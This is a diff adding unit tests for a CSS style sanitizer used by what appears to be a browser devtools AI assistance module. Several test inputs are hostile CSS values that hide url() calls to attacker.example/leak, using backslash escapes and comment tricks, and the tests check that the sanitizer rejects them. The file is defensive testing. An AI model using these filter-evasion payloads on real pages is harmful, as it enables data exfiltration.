@@ -106,6 +106,47 @@ describe('DOMHelpers', () => {
         color: 'red',
       });
     });
+
+    it('retains valid var() custom property references', async () => {
+      const sanitized = await AiAssistance.DOMHelpers.sanitizeStyleChanges('div', {
+        color: 'var(--theme-text, blue)',
+      });
+      assert.deepEqual(sanitized, {
+        color: 'var(--theme-text, blue)',
+      });
+    });
+
+    it('retains single-quoted strings that CSSOM serializes with escaped double quotes', async () => {
+      const sanitized = await AiAssistance.DOMHelpers.sanitizeStyleChanges('div', {
+        content: '\'"AI"\'',
+      });
+      assert.deepEqual(sanitized, {
+        content: '"\\"AI\\""',
+      });
+    });
+
+    it('rejects CSS backslash-escaped url() functions inside var() declarations', async () => {
+      const sanitized = await AiAssistance.DOMHelpers.sanitizeStyleChanges('div', {
+        color: 'red',
+        backgroundImage: 'var(--unset, \\75\\72\\6c("https://attacker.example/leak"))',
+        maskImage: 'var(--unset, ur\\l("https://attacker.example/leak"))',
+      });
+      assert.deepEqual(sanitized, {
+        color: 'red',
+      });
+    });
+
+    it('rejects CSS values containing /* comment openers', async () => {
+      const sanitized = await AiAssistance.DOMHelpers.sanitizeStyleChanges('div', {
+        color: 'red',
+        content: '"/*" url("https://attacker.example/leak?*/")',
+        borderImage: 'var(--unset, stretch/**/url("https://attacker.example/leak"))',
+        backgroundColor: 'blue /* comment */',
+      });
+      assert.deepEqual(sanitized, {
+        color: 'red',
+      });
+    });
   });
 
   describe('removeInlineStyleProperties', () => {
